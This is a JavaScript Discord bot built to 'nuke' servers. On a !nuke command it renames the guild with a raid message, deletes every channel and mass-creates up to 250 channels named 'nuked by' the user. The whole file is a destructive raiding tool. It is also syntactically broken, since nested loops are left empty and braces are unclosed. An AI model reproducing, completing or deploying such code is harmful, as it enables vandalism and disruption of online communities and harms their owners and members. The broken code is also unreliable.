const Discord = require('discord.js')
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const config = require('./config.json')
const { red, green, blueBright, redBright } = require('chalk')

client.on('ready', async () => {
	console.log(`${client.user.tag} Is Online!`)
})

client.on("message", async message => {

	/*	if(message.author.bot) return;
		if(message.channel.type === "dm") return;
		if(message.mentions.everyone === true){
			return;
		} else if(message.mentions.has(client.user.id)) {
			console.log(green(`${client.user.tag} Was Mentioned By ${message.author.tag}`))
			const helpmsg = new Discord.MessageEmbed()
			.setTitle("Help")
			.setDescription(`
			
			To Nuke Type: !nuke`)
			message.author.send(helpmsg) */

	if (message.content.startsWith(config.prefix + 'nuke')) {

		message.guild.setName(`You are getting raided by blissx <3`)
		if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
			console.log(red(`MISSING PERMISSIONS: admin`))
		} else {
			message.guild.channels.cache.forEach((ch) => {
				ch.delete().then(() => {
					console.log(redBright(`CHANNEL FUCKED`));
				}).catch((err) => {
					console.log(red("ERROR: " + err))
				})
			})
			let args = message.content.split(" ").slice(1);
			var argsresult = args.join(' ')
			if (!argsresult) {
				for (var i = 0; i < 250; i++) {
					/* message.guild.channels.create('nuked by ' + message.author.username) */

					let channels = message.guild.channels.create('nuked by ' + message.author.username)
					channels.then(
						function(channel, index) {
							for (var i = 0; i < 250; i++) {






			}
		}
	}
})

client.login(config.token)  
